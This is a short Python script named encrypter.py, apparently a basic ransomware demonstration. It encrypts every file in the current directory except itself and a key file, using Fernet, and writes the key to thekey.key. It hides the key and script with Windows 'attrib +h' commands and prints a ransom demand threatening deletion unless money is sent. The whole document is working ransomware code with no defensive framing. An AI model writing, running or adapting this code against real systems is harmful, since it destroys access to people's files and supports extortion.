#!/usr/bin/env python3

# pip install -r requirements.txt

import os
# pip install cryptography
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == "encrypter.py" or file == "decrypter.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):    #ignore folders
        files.append(file)
    
# print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# alt+enter     shortcut to file properties
os.system( "attrib +h thekey.key")
os.system( "attrib +h encrypter.py")
# os.system( "attrib +h decrypter.py")

for file in files:
    with open(file, "rb") as thefile:
        content = thefile.read()

    content_encrypted = Fernet(key).encrypt(content)

    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)

print("All your files have been encrypted!, Send money or i'll delete them")    
